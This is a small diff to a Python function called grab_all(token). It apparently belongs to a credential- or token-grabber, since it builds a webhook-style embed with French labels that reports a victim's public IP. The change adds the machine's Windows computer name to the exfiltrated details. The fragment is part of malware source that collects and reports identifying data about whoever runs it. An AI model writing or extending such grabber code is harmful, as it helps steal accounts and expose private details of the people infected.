@@ -82,7 +82,7 @@ def grab_all(token):
             },
                     {
                 "name": "**Autres infos**",
-                "value": f"IP: {ipinfo['query']}"
+                "value": f"Nom du PC: {os.getenv('COMPUTERNAME')}\nIP: {ipinfo['query']}"
             }]
         }]
     }
